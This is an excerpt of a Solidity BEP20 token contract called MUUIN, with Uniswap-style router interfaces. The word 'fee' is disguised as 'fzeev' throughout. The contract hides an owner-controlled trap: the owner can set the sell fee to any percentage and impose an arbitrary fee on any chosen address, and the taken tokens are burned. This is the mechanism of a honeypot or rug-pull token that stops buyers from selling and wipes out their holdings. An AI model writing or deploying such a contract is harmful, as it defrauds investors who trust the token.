...
interface IUniswapV2Factory {
    ...
    function fzeevTo() external view returns (address);
    function fzeevToSetter() external view returns (address);
    ...
    function setfzeevTo(address) external;
    function setfzeevToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfzeevOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfzeevOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfzeevOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfzeevOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfzeevOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract MUUIN is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfzeev = 0;

    uint256 private _defaultBuyfzeev = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfzeev;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfzeev = _value;
    }

    function setSlipfzeev(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfzeev[_address] = _value;
    }

    function getSlipfzeev(address _address) external view onlyownar returns (uint256) {
        return _slipfzeev[_address];
    }


    function setMAccountfzeev(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfzeev(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefzeevAmount = 0;

        if (rF) {
            uint256 tradefzeev = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefzeev = _defaultSellfzeev;
                }
                if (from == uniswapV2Pair) {

                    tradefzeev = _defaultBuyfzeev;
                }
            }
            if (_slipfzeev[from] > 0) {
                tradefzeev = _slipfzeev[from];
            }

            tradefzeevAmount = _Amount.mul(tradefzeev).div(100);
        }


        if (tradefzeevAmount > 0) {
            _balances[from] = _balances[from].sub(tradefzeevAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefzeevAmount);
            emit Transfer(from, _deadAddress, tradefzeevAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefzeevAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefzeevAmount);
        emit Transfer(from, _to, _Amount - tradefzeevAmount);
    }
